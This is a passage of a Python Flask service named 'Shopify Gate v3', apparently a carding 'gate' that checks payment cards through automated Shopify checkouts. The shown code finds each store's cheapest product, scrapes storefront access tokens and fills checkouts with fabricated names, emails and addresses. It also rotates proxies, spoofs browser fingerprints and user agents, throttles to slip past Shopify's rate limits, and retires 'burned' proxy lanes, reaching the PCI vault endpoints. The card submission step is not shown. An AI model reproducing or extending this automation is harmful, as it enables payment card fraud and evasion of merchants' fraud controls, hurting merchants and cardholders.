#!/usr/bin/env python3
"""
Shopify Gate v3 — fresh build.
Lean flow: discovery -> checkout init -> 2 proposals -> PCI (4 vaults) ->
submit (renegotiation+retries) -> poll verdict.
Fallback transport: /checkouts/unstable/graphql with full documents.
"""
import base64
import html as htmllib
import json
import os
import random
import re
import threading
import time
import urllib.parse

from flask import Flask, request, jsonify
from curl_cffi import requests as curl_requests

app = Flask(__name__)

PORT = int(os.environ.get("PORT", "8090"))

_SHOP_PACE = {}


def _pace(shop_url):
    """Space repeat hits to the same shop so bursts don't trip Shopify's wall."""
    now = time.time()
    last = _SHOP_PACE.get(shop_url, 0)
    wait = 0.9 - (now - last)
    if wait > 0:
        time.sleep(wait)
    _SHOP_PACE[shop_url] = time.time()

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

PROPOSAL_ID = "8cf6fd878e15e1a82c73ddf332175321294a86a35c894d5bcedc7a4400c68ebb"
SUBMIT_ID = "51ea6a6dd873dd6e77892cb78b9f9574626169f1f664e3914f21b280f80ac4d9"
POLL_ID = "658bb809ab07c0463243990c0c79fd8f2eacb112e7ea5c8f2cef6bc7b109127a"

PCI_ENDPOINTS = [
    "https://deposit.shopifycs.com/sessions",
    "https://elb.deposit.shopifycs.com/sessions",
    "https://deposit.us.shopifycs.com/sessions",
    "https://checkout.pci.shopifyinc.com/sessions",
]

_GQL = {}
try:
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "gql_docs.json")) as _f:
        _GQL = json.load(_f)
except Exception:
    pass

_ID_CACHE = {}
_PRODUCT_CACHE = {}
_currency_cache = {}

FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "thomas", "charles", "daniel"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "anderson", "taylor"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]

COUNTRY_ADDRESSES = {
    "US": ("james", "anderson", "428 W 45th St", "Apt 4B", "New York", "US", "NY", "10036", "+12125550100"),
    "CA": ("john", "smith", "200 Kent St", "", "Ottawa", "CA", "ON", "K1A 0G9", "+16135550100"),
    "GB": ("james", "wilson", "10 Downing St", "", "London", "GB", "ENG", "SW1A 2AA", "+442012345678"),
    "AU": ("thomas", "taylor", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212345678"),
    "DE": ("lucas", "thomas", "Friedrichstr 100", "", "Berlin", "DE", "BE", "10117", "+493012345678"),
    "FR": ("hugo", "bernard", "10 Rue de Rivoli", "", "Paris", "FR", "IDF", "75001", "+33112345678"),
    "NZ": ("jack", "wilson", "1 Queen St", "", "Auckland", "NZ", "AUK", "1010", "+6491234567"),
    "IE": ("sean", "murphy", "1 Grafton St", "", "Dublin", "IE", "D", "D02 Y006", "+35311234567"),
    "NL": ("bas", "jansen", "Dam 1", "", "Amsterdam", "NL", "NH", "1012 JS", "+31201234567"),
    "ES": ("carlos", "garcia", "Calle Mayor 1", "", "Madrid", "ES", "M", "28013", "+34912345678"),
    "IT": ("marco", "rossi", "Via Roma 1", "", "Rome", "IT", "RM", "00184", "+39061234567"),
    "SE": ("erik", "andersson", "Vasagatan 1", "", "Stockholm", "SE", "AB", "111 20", "+468123456"),
    "JP": ("takashi", "yamamoto", "1-1-1 Marunouchi", "", "Tokyo", "JP", "13", "100-0005", "+81312345678"),
    "SG": ("wei", "tan", "1 Raffles Place", "#01-01", "Singapore", "SG", "01", "048616", "+6561234567"),
    "AE": ("ahmed", "al-mansouri", "Sheikh Zayed Road 1", "", "Dubai", "AE", "DU", "12345", "+97141234567"),
    "IN": ("arjun", "sharma", "12 MG Road", "", "Mumbai", "IN", "MH", "400001", "+919876543210"),
    "BR": ("joao", "silva", "Av Paulista 100", "", "Sao Paulo", "BR", "SP", "01310-000", "+5511987654321"),
    "CH": ("luca", "muller", "Bahnhofstrasse 1", "", "Zurich", "CH", "ZH", "8001", "+41441234567"),
    "HK": ("kai", "chan", "1 Harbour Road", "", "Wan Chai", "HK", "HK", "999077", "+85212345678"),
    "DK": ("mikkel", "nielsen", "Stroget 1", "", "Copenhagen", "DK", "84", "1200", "+4512345678"),
    "NO": ("ola", "hansen", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4712345678"),
    "IL": ("david", "cohen", "1 Rothschild Blvd", "", "Tel Aviv", "IL", "TA", "6100001", "+972512345678"),
    "KR": ("min-jun", "kim", "1 Gangnam-daero", "", "Seoul", "KR", "11", "06027", "+821012345678"),
}

CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU", "EUR": "DE", "NZD": "NZ",
    "JPY": "JP", "SGD": "SG", "AED": "AE", "INR": "IN", "CHF": "CH", "HKD": "HK",
    "SEK": "SE", "DKK": "DK", "NOK": "NO", "ILS": "IL", "KRW": "KR", "BRL": "BR",
}

JUNK_TITLES = ("gift card", "giftcard", "e-gift", "egift")

STOREFRONT_GQL_QUERY = (
    '{"query": "{ products(first: 250) { edges { node { id title '
    'variants(first: 20) { edges { node { id availableForSale price { amount currencyCode } } } } } } } }"}'
)

TOKEN_GQL_SORTED_QUERY = (
    'query StorefrontProducts($first: Int!, $cursor: String) { products(first: $first, after: $cursor, sortKey: PRICE) '
    '{ pageInfo { hasNextPage endCursor } edges { node { id title variants(first: 20) { edges { node { id availableForSale price { amount currencyCode } } } } } } } }'
)

STOREFRONT_TOKEN_PATTERNS = [
    re.compile(r'(?i)storefrontAccessToken\\":\\"([a-f0-9]{32})'),
    re.compile(r'(?i)accessToken\\":\\"([a-f0-9]{32})'),
    re.compile(r'(?i)storefrontAccessToken["\'\s:]+([a-f0-9]{32})'),
    re.compile(r'(?i)publicStorefrontToken["\'\s:]+([a-f0-9]{32})'),
    re.compile(r'(?i)accessToken["\'\s:]+([a-f0-9]{32})'),
    re.compile(r'(?i)x-shopify-storefront-access-token["\'\s:]+([a-f0-9]{32})'),
]


def _norm_proxy(p):
    p = (p or "").strip()
    if not p:
        return p
    if not re.match(r"^[a-z][a-z0-9+.-]*://", p, re.IGNORECASE):
        p = "http://" + p
    return p


_PROXY_HEALTH = {}


def _proxy_ok(proxy, probe_url, timeout=2):
    hit = _PROXY_HEALTH.get(proxy)
    if hit and time.time() - hit[1] < 30:
        return hit[0]
    ok = False
    try:
        with curl_requests.Session(impersonate="chrome124") as s:
            s.timeout = timeout
            s.proxies = {"http": proxy, "https": proxy}
            r = s.get(probe_url, timeout=timeout)
            ok = r.status_code < 600
    except Exception:
        ok = False
    _PROXY_HEALTH[proxy] = (ok, time.time())
    return ok


def _post_retry(session, url, proxies=None, timeout=10, attempts=2, **kw):
    plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
    if plist:
        plist.append(None)
    else:
        plist = [None]
    last = None
    for i in range(attempts):
        pxy = plist[i % len(plist)]
        try:
            r = session.post(url, proxy=pxy, timeout=timeout, **kw)
            return r.status_code, r.text
        except Exception as e:
            last = e
            time.sleep(0.1)
    return 0, f"__NETERR__:{str(last)[:120]}"


def _get_retry(session, url, proxies=None, timeout=10, **kw):
    plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
    if plist:
        plist.append(None)
    else:
        plist = [None]
    last = None
    for pxy in plist:
        try:
            r = session.get(url, proxy=pxy, timeout=timeout, **kw)
            return r.status_code, r.text
        except Exception as e:
            last = e
    return 0, f"__NETERR__:{str(last)[:120]}"


def _extract(s, regex, group=1):
    m = re.search(regex, s or "")
    return m.group(group) if m else ""


def generate_random_email():
    return (random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999)) + "@" + random.choice(EMAIL_DOMAINS)).lower()


def random_address(country="US"):
    first, last, a1, a2, city, cc, zone, zip_, phone = COUNTRY_ADDRESSES.get(country, COUNTRY_ADDRESSES["US"])
    street_num = random.randint(100, 999)
    a1 = f"{street_num} {a1.split(' ', 1)[-1]}" if a1 else a1
    if not a2:
        a2 = f"Apt {random.randint(1, 99)}"
    phone = phone[:-4] + str(random.randint(1000, 9999))
    return {
        "firstName": first.capitalize(), "lastName": last.capitalize(),
        "address1": a1, "address2": a2, "city": city,
        "countryCode": cc, "state": zone, "zip": zip_,
        "phone": phone,
    }


def fetch_store_currency(shop_url, proxy=None):
    if shop_url in _currency_cache:
        return _currency_cache[shop_url]
    for p in (_norm_proxy(proxy) if proxy else None, None):
        try:
            with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as s:
                s.timeout = 10
                if p:
                    s.proxies = {"http": p, "https": p}
                r = s.get(f"{shop_url}/payments/config.json")
                if r.status_code == 200:
                    d = r.json()
                    pi = d.get("paymentInstruments", {})
                    for cfg, c_key in [("applePayConfig", "currencyCode"), ("googlePayConfig", "currency")]:
                        c = pi.get(cfg, {})
                        if c and c.get(c_key):
                            currency = c[c_key]
                            country = c.get("countryCode", CURRENCY_TO_COUNTRY.get(currency, "US"))
                            _currency_cache[shop_url] = (currency, country)
                            return currency, country
                    if pi.get("currency"):
                        currency = pi["currency"]
                        country = CURRENCY_TO_COUNTRY.get(currency, "US")
                        _currency_cache[shop_url] = (currency, country)
                        return currency, country
        except Exception:
            continue
    return "USD", "US"


def _is_junk(title):
    t = (title or "").lower()
    return any(j in t for j in JUNK_TITLES)


def _edges_to_candidates(edges, min_price, max_price):
    candidates = []
    for e in edges:
        node = e.get("node", {})
        title = node.get("title", "")
        if _is_junk(title):
            continue
        pid = node.get("id", "").split("/")[-1]
        for ve in node.get("variants", {}).get("edges", []):
            vn = ve.get("node", {})
            if not vn.get("availableForSale", True):
                continue
            po = vn.get("price", {})
            try:
                price = float(po.get("amount", 0) if isinstance(po, dict) else po)
            except (ValueError, TypeError):
                continue
            if price < min_price or (max_price > 0 and price > max_price):
                continue
            candidates.append({"product_id": pid, "product_title": title, "handle": "",
                               "variant_id": vn.get("id", "").split("/")[-1], "variant_title": "",
                               "price": price, "currency": "", "available": True, "inventory": 0})
    if not candidates:
        return None
    candidates.sort(key=lambda x: x["price"])
    return candidates[0]


def _fetch_storefront_token(session, shop_url):
    for path in ("/cart", "/", "/collections/all"):
        try:
            r = session.get(shop_url + path, allow_redirects=True)
            body = r.text or ""
            for pat in STOREFRONT_TOKEN_PATTERNS:
                m = pat.search(body)
                if m:
                    return m.group(1)
        except Exception:
            continue
    return ""


def _find_token_gql(session, shop_url, min_price, max_price, tok=None):
    if tok is None:
        tok = _fetch_storefront_token(session, shop_url)
    if not tok:
        return None
    edges = []
    cursor = None
    for _ in range(3):
        try:
            r = session.post(f"{shop_url}/api/unstable/graphql.json",
                             json={"query": TOKEN_GQL_SORTED_QUERY, "variables": {"first": 100, "cursor": cursor}},
                             headers={"content-type": "application/json", "accept": "application/json",
                                      "x-shopify-storefront-access-token": tok, "origin": shop_url,
                                      "referer": shop_url + "/", "user-agent": random.choice(USER_AGENTS)})
            if r.status_code != 200:
                break
            data = r.json()
            products = data.get("data", {}).get("products", {}) or {}
            edges.extend(products.get("edges", []) or [])
            page_info = products.get("pageInfo", {}) or {}
            if not edges or not page_info.get("hasNextPage"):
                break
            cursor = page_info.get("endCursor") or ""
        except Exception:
            break
    return _edges_to_candidates(edges, min_price, max_price) if edges else None


def _find_unstable_gql(session, shop_url, min_price, max_price, tok=""):
    headers = {"content-type": "application/json", "accept": "application/json",
               "x-shopify-schema-handle": "storefront", "x-shopify-version-handle": "unstable",
               "origin": shop_url, "referer": shop_url + "/", "user-agent": random.choice(USER_AGENTS)}
    if tok:
        headers["x-shopify-storefront-access-token"] = tok
    try:
        r = session.post(f"{shop_url}/api/unstable/graphql.json", data=STOREFRONT_GQL_QUERY, headers=headers)
        if r.status_code != 200:
            return None
        return _edges_to_candidates(r.json().get("data", {}).get("products", {}).get("edges", []), min_price, max_price)
    except Exception:
        return None


def _find_versioned_gql(session, shop_url, min_price, max_price, tok=""):
    if not tok:
        tok = _fetch_storefront_token(session, shop_url)
    for ver in ("2025-01", "2024-10", "2024-07", "2024-01", "2026-01", "2026-04"):
        headers = {"content-type": "application/json", "accept": "application/json",
                   "origin": shop_url, "referer": shop_url + "/", "user-agent": random.choice(USER_AGENTS)}
        if tok:
            headers["x-shopify-storefront-access-token"] = tok
        try:
            r = session.post(f"{shop_url}/api/{ver}/graphql.json", data=STOREFRONT_GQL_QUERY, headers=headers)
            if r.status_code != 200:
                continue
            res = _edges_to_candidates(r.json().get("data", {}).get("products", {}).get("edges", []), min_price, max_price)
            if res:
                return res
        except Exception:
            continue
    return None


def _find_collections_json(session, shop_url, min_price, max_price):
    try:
        r = session.get(f"{shop_url}/collections/all/products.json?limit=250",
                        headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
        if r.status_code != 200:
            return None
        products = r.json().get("products", [])
    except Exception:
        return None
    best = None
    for p in products:
        if _is_junk(p.get("title", "")):
            continue
        for v in p.get("variants", []):
            if not v.get("available", True):
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < min_price or (max_price > 0 and price > max_price):
                continue
            cand = {"product_id": str(p.get("id", "")), "product_title": p.get("title", ""),
                    "handle": p.get("handle", ""), "variant_id": str(v.get("id", "")),
                    "variant_title": v.get("title", ""), "price": price, "currency": "USD",
                    "available": True, "inventory": 0}
            if best is None or price < best["price"]:
                best = cand
    return best


def _find_search_suggest(session, shop_url, min_price, max_price):
    try:
        r = session.get(f"{shop_url}/search/suggest.json?q=*&resources[type]=product&resources[limit]=10",
                        headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
        if r.status_code != 200:
            return None
        handles = [p.get("handle") for p in r.json().get("resources", {}).get("results", {}).get("products", []) if p.get("handle")]
    except Exception:
        return None
    best = None
    for h in handles:
        try:
            r = session.get(f"{shop_url}/products/{h}.json", headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
            if r.status_code != 200:
                continue
            pdata = r.json().get("product", {})
            if _is_junk(pdata.get("title", "")):
                continue
            for v in pdata.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price or (max_price > 0 and price > max_price):
                    continue
                cand = {"product_id": str(pdata.get("id", "")), "product_title": pdata.get("title", ""),
                        "handle": h, "variant_id": str(v.get("id", "")), "variant_title": v.get("title", ""),
                        "price": price, "currency": "USD", "available": True, "inventory": 0}
                if best is None or price < best["price"]:
                    best = cand
        except Exception:
            continue
    return best


def _find_sitemap(session, shop_url, min_price, max_price):
    try:
        r = session.get(f"{shop_url}/sitemap_products_1.xml", headers={"accept": "text/xml,*/*", "user-agent": random.choice(USER_AGENTS)})
        if r.status_code != 200:
            return None
        handles = list(dict.fromkeys(re.findall(r"/products/([A-Za-z0-9_-]+)", r.text)))[:30]
    except Exception:
        return None
    best = None
    for h in handles:
        try:
            r = session.get(f"{shop_url}/products/{h}.json", headers={"accept": "application/json", "user-agent": random.choice(USER_AGENTS)})
            if r.status_code != 200:
                continue
            pdata = r.json().get("product", {})
            if _is_junk(pdata.get("title", "")):
                continue
            for v in pdata.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price or (max_price > 0 and price > max_price):
                    continue
                cand = {"product_id": str(pdata.get("id", "")), "product_title": pdata.get("title", ""),
                        "handle": h, "variant_id": str(v.get("id", "")), "variant_title": v.get("title", ""),
                        "price": price, "currency": "USD", "available": True, "inventory": 0}
                if best is None or price < best["price"]:
                    best = cand
        except Exception:
            continue
    return best


def _discover_products(shop_url, proxy, min_price, max_price):
    proxy_url = _norm_proxy(proxy or None)
    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
        session.timeout = 10
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        tok = _fetch_storefront_token(session, shop_url)
        for fn in (_find_token_gql, _find_unstable_gql, _find_versioned_gql):
            try:
                r = fn(session, shop_url, min_price, max_price, tok)
                if r:
                    return r
            except Exception:
                continue
        for fn in (_find_collections_json, _find_search_suggest, _find_sitemap):
            try:
                r = fn(session, shop_url, min_price, max_price)
                if r:
                    return r
            except Exception:
                continue
    return None


def find_cheapest_product(shop_url, proxy=None, min_price=0.50, max_price=0.0):
    key = (shop_url, min_price, max_price)
    cached = _PRODUCT_CACHE.get(key)
    if cached and time.time() - cached[0] < 300:
        return cached[1]
    r = _discover_products(shop_url, proxy, min_price, max_price)
    if not r and proxy:
        r = _discover_products(shop_url, None, min_price, max_price)
    if r:
        _PRODUCT_CACHE[key] = (time.time(), r)
    return r


def _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url):
    tok = _fetch_storefront_token(session, shop_url)
    headers = {"content-type": "application/json", "accept": "application/json",
               "origin": shop_url, "referer": shop_url + "/", "user-agent": random.choice(USER_AGENTS)}
    if tok:
        headers["x-shopify-storefront-access-token"] = tok
    gid = variant_id if variant_id.startswith("gid://") else f"gid://shopify/ProductVariant/{variant_id}"
    mutation = """
    mutation CartCreate($input: CartInput!, $country: CountryCode!) @inContext(country: $country) {
        cartCreate(input: $input) { cart { id checkoutUrl } userErrors { field message code } }
    }"""
    for ver in ("2024-01", "2025-01", "2026-01"):
        try:
            r = session.post(f"{shop_url}/api/{ver}/graphql.json",
                             json={"query": mutation, "variables": {
                                 "input": {"lines": [{"merchandiseId": gid, "quantity": 1}],
                                           "buyerIdentity": {"countryCode": country}},
                                 "country": country}},
                             headers=headers, proxy=proxy_url)
            if r.status_code != 200:
                continue
            cu = ((r.json().get("data", {}).get("cartCreate", {}) or {}).get("cart") or {}).get("checkoutUrl", "")
            if cu:
                return cu
        except Exception:
            continue
    return ""


def _checkout_init(session, shop_url, variant_id, country, proxy_url):
    try:
        r = session.get(f"{shop_url}/cart/{variant_id}:1", allow_redirects=True,
                        headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                 "accept-language": "en-US,en;q=0.9", "referer": shop_url + "/",
                                 "user-agent": random.choice(USER_AGENTS)}, proxy=proxy_url)
        html = r.text
        if "/checkouts/cn/" in str(r.url) and "serialized-sessionToken" in html:
            return str(r.url), html
    except Exception:
        pass
    try:
        session.post(f"{shop_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, proxy=proxy_url)
        r = session.get(f"{shop_url}/checkout", allow_redirects=True, proxy=proxy_url)
        html = r.text
        if "/checkouts/cn/" in str(r.url) and "serialized-sessionToken" in html:
            return str(r.url), html
    except Exception:
        pass
    try:
        cu = _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url)
        if cu:
            r = session.get(cu, allow_redirects=True, proxy=proxy_url)
            html = r.text
            if "/checkouts/cn/" in str(r.url) and "serialized-sessionToken" in html:
                return str(r.url), html
    except Exception:
        pass
    return "", ""


def _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token):
    return {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": random.choice(USER_AGENTS),
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


def _build_proposal_variables(session_token, queue_token, stable_id, variant_id, email, addr, currency, country, captcha=None, email_changed=False):
    addr1 = addr.get("address1", ""); addr2 = addr.get("address2", ""); city = addr.get("city", "")
    postal = addr.get("zip", ""); first = addr.get("firstName", ""); last = addr.get("lastName", "")
    zone = addr.get("state", ""); phone = addr.get("phone", ""); cc = addr.get("countryCode", country)
    destination = {"partialStreetAddress": {
        "address1": addr1, "address2": addr2, "city": city, "countryCode": cc,
        "postalCode": postal, "firstName": first, "lastName": last,
        "zoneCode": zone, "phone": phone, "oneTimeUse": False,
    }}
    buyer = {
        "customer": {"presentmentCurrency": currency, "countryCode": country},
        "phoneCountryCode": country, "marketingConsent": [],
        "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False,
    }
    if email:
        buyer["email"] = email
        buyer["emailChanged"] = email_changed
    return {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token,
        "captcha": captcha,
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [{
                "destination": destination,
                "selectedDeliveryStrategy": {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True}, "shipments": {"any": True},
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"any": True},
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": True,
            }],
            "noDeliveryRequired": [], "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True,
        },
        "deliveryExpectations": {"deliveryExpectationLines": []},
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"any": True},
                "lineComponentsSource": None, "lineComponents": [],
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True}, "paymentLines": [],
            "billingAddress": {"streetAddress": {
                "address1": addr1, "address2": addr2, "city": city, "countryCode": cc,
                "postalCode": postal, "firstName": first, "lastName": last,
                "zoneCode": zone, "phone": phone,
            }},
        },
        "buyerIdentity": buyer,
        "tip": {"tipLines": []}, "poNumber": None,
        "taxes": {
            "proposedAllocations": None, "proposedTotalAmount": {"any": True},
            "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None, "signatureUuid": None,
            "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }


def _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
                   build_id, source_token, variables, proposal_id=None, proxies=None):
    pid = proposal_id or PROPOSAL_ID
    payload = json.dumps({"variables": variables, "operationName": "Proposal", "id": pid})
    url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
    headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    for _ in range(3):
        status, body = _post_retry(session, url, proxies=proxies, data=payload, headers=headers)
        if status in (429, 403) or status >= 500:
            time.sleep(random.uniform(1.0, 1.6))
            continue
        return status, body
    doc = _GQL.get("proposal")
    if doc:
        fb = json.dumps({"operationName": "Proposal", "variables": variables, "query": doc})
        return _post_retry(session, f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal",
                           proxies=proxies, data=fb, headers=headers)
    return status, body


def _seller_proposal(body):
    try:
        return json.loads(body).get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {})
    except Exception:
        return {}


def _extract_delivery_handle(body):
    seller = _seller_proposal(body)
    dlv = seller.get("delivery", {})
    h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
    if h:
        return h
    for line in dlv.get("deliveryLines", []):
        h = line.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        for macro in line.get("deliveryMacros", []):
            handles = macro.get("deliveryStrategyHandles", [])
            if handles:
                return handles[0]
    return _extract(body, r'"handle"\s*:\s*"([a-f0-9]{8}-[a-f0-9]{8}-[a-f0-9]{8}-[a-f0-9]{8}-[a-f0-9]{12})"')


def _extract_signed_handles(body):
    seller = _seller_proposal(body)
    de = seller.get("deliveryExpectations", {})
    if de.get("__typename") == "FilledDeliveryExpectationTerms":
        return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
    return []


def _extract_total(body):
    seller = _seller_proposal(body)
    for key in ("checkoutTotal", "total", "runningTotal"):
        v = seller.get(key) or {}
        if isinstance(v, dict):
            amt = (v.get("value") or {}).get("amount", "")
            if amt:
                return amt
    return _extract(body, r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')


def _extract_tax(body):
    seller = _seller_proposal(body)
    v = seller.get("tax") or {}
    if isinstance(v, dict):
        return (v.get("totalTaxAmount") or {}).get("value", {}).get("amount", "0.0") or "0.0"
    return "0.0"


def _extract_is_shipping_required(body):
    try:
        return _seller_proposal(body).get("isShippingRequired", True)
    except Exception:
        return True


def _extract_payment_method_id(body):
    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"', body or "")
    if m:
        return m.group(1)
    try:
        seller = _seller_proposal(body)
        for line in seller.get("payment", {}).get("availablePaymentLines", []):
            pm = line.get("paymentMethod", {})
            if pm.get("name") == "shopify_payments" and pm.get("paymentMethodIdentifier"):
                return pm.get("paymentMethodIdentifier")
    except Exception:
        pass
    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([a-f0-9]{32})"', body or "")
    return m.group(1) if m else ""


def _extract_payment_flexibility_terms_id(body):
    try:
        seller = _seller_proposal(body)
        tmpl = seller.get("payment", {}).get("paymentFlexibilityPaymentTermsTemplate")
        if tmpl and isinstance(tmpl, dict):
            return tmpl.get("id", "")
    except Exception:
        pass
    return ""


def _extract_supported_currency(body):
    return _extract(body, r'"supportedCurrencies"\s*:\s*\["([^"]+)"')


def _extract_supported_country(body):
    return _extract(body, r'"supportedCountries"\s*:\s*\["([^"]+)"')


def _extract_gateway(body):
    try:
        seller = _seller_proposal(body)
        for line in seller.get("payment", {}).get("availablePaymentLines", []):
            pm = line.get("paymentMethod", {})
            name = pm.get("name", "")
            if name and name not in ("AnyGiftCardPaymentMethod", "ShopPayWalletConfig", "SHOP_PAY"):
                return name
    except Exception:
        pass
    m = re.search(r'"name"\s*:\s*"(shopify_payments|authorize_net|stripe|cybersource|oceanpayment|braintree|iyzico|razorpay)"', body or "", re.IGNORECASE)
    return m.group(1) if m else "shopify_payments"


def _extract_pci_build_hash(checkout_html):
    decoded = checkout_html.replace("&quot;", '"').replace("&#34;", '"')
    for pat in [
        r'https://checkout\.pci\.shopify(?:inc|cs)\.com/build/([a-f0-9]{6,10})/',
        r'/build/([a-f0-9]{6,10})/(?:card_fields|number-|expiry-|cvv-)',
        r'appVersion[\\: \t"\']*([a-f0-9]{7,10})',
    ]:
        m = re.search(pat, decoded)
        if m:
            return m.group(1)
    return ""


def _extract_vault_domain(checkout_html):
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', checkout_html.replace("&quot;", '"'))
    return m.group(1) if m else ""


def _extract_actions_js_url(html_text, shop_url):
    for p in [r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)',
              r'(/cdn/shopifycloud/checkout-web/assets/[^"]*actions[^"]*\.js)']:
        m = re.search(p, html_text)
        if m:
            return shop_url + m.group(1)
    return ""


def _extract_js_id(js_body, name, type_):
    for p in [rf'id:\s*"([a-f0-9]{{64}})"\s*,\s*type:\s*"{type_}"\s*,\s*name:\s*"{name}"',
              rf'name:\s*"{name}"\s*,\s*type:\s*"{type_}"\s*,\s*id:\s*"([a-f0-9]{{64}})"',
              rf'"{name}"[^}}]{{0,200}}id:\s*"([a-f0-9]{{64}})"',
              rf'id:\s*"([a-f0-9]{{64}})"[^}}]{{0,200}}"{name}"']:
        m = re.search(p, js_body)
        if m:
            return m.group(1)
    return ""


_VAULT_CACHE = {}

_PCI_COOLDOWN = {}
_PCI_BURN_COUNT = {}
PCI_BURN_SECONDS = 180

_ALIVE_RING = []


def _lane_key(pxy):
    return pxy or "DIRECT"


def _lane_cooling(pxy):
    until = _PCI_COOLDOWN.get(_lane_key(pxy))
    return bool(until and time.time() < until)


def _lane_burn(pxy, seconds=None):
    key = _lane_key(pxy)
    cnt = _PCI_BURN_COUNT.get(key, 0) + 1
    _PCI_BURN_COUNT[key] = cnt
    if seconds is None:
        seconds = PCI_BURN_SECONDS
        if cnt >= 4:
            seconds = 3600
        elif cnt >= 2:
            seconds = 600
    _PCI_COOLDOWN[key] = time.time() + seconds


def _lane_recovered(pxy):
    _PCI_BURN_COUNT.pop(_lane_key(pxy), None)


def _remember_alive(p):
    if not p:
        return
    _ALIVE_RING.append((p, time.time()))
    while len(_ALIVE_RING) > 60:
        _ALIVE_RING.pop(0)


